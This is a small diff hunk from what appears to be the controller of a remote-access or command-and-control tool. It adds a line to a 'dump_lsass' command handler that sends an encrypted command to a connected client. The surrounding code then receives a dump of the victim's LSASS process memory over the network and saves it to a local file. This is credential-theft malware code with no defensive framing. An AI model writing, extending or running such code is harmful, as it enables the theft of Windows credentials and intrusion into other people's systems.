@@ -407,6 +407,7 @@ dumplsass                  dump lsass
 
             if command == 'dump_lsass':
                 try:
+                    client.send(command_encrypted.encode())
                     with open("received_lsass.dmp", "wb") as dump_file:
                         while True:
                             data = client.recv(4096)
